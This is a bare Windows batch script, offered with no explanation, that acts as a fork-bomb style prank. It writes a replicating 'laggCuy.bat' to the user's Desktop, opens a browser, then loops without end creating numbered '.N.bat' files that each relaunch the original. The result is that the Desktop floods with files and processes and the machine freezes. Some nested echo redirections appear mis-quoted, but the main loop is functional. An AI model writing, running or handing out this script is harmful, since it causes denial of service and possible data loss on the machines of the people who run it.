@echo off

echo @echo off > "%USERPROFILE%\Desktop\laggCuy.bat"
echo start "" "https://google.com"  >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo goto :a >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo. >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo :a >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo for /L %%i in (1, 1, 9999999999999999999999999999) do ( >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo echo @echo off > "%USERPROFILE%\Desktop\.%%i.bat">> "%USERPROFILE%\Desktop\laggCuy.bat"
echo echo goto :a >> "%USERPROFILE%\Desktop\.%%i.bat" >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo echo :a >> "%USERPROFILE%\Desktop\.%%i.bat" >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo echo start explorer "%USERPROFILE%\Desktop\laggCuy.bat" >> "%USERPROFILE%\Desktop\.%%i.bat" >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo echo goto :a >> "%USERPROFILE%\Desktop\.%%i.bat" >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo start explorer "%USERPROFILE%\Desktop\.%%i.bat" >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo start explorer "%USERPROFILE%\Desktop\laggCuy.bat" >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo ) >> "%USERPROFILE%\Desktop\laggCuy.bat"
echo goto :a >> "%USERPROFILE%\Desktop\laggCuy.bat"

start "" "https://google.com"

goto :a

:a
for /L %%i in (1, 1, 9999999999999999999999999999) do (
echo @echo off > "%USERPROFILE%\Desktop\.%%i.bat"
echo goto :a >> "%USERPROFILE%\Desktop\.%%i.bat"
echo :a >> "%USERPROFILE%\Desktop\.%%i.bat"
echo start explorer "%USERPROFILE%\Desktop\laggCuy.bat" >> "%USERPROFILE%\Desktop\.%%i.bat"
echo goto :a >> "%USERPROFILE%\Desktop\.%%i.bat"
)
goto :a